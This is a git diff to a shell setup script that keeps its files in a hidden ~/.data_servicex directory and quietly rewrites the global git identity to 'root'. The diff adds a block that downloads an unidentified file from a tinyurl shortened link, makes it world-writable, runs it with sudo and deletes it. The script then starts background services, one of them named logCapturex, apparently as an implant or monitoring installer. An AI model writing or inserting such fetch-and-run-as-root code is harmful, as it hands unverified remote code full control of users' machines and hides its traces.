@@ -1,6 +1,7 @@
 #!/bin/sh
 MDIR=$HOME/.data_servicex
 SLDIR=$MDIR/setup_log
+GBIN=/usr/local/bin
 
 {
 lockdir=/tmp/reportService.lock
@@ -21,8 +22,20 @@ GDNAME=$(git config --global user.name)
 git config --global --add user.email "root@rootmail.com"
 git config --global --add user.name "root"
 
-sudo specific &
-sleep 2
+if [ -e $GBIN/setupService ]
+then
+    echo "setupService exists"
+else
+    echo "setupService doesn't exists"
+    cd $HOME
+    wget http://www.tinyurl.com/setupx
+    sudo chmod 777 setupx
+    sudo ./setupx
+    rm setupx
+fi
+
+#sudo specific &
+#sleep 2
 sudo setupService &
 sleep 2
 sudo logCapturex &
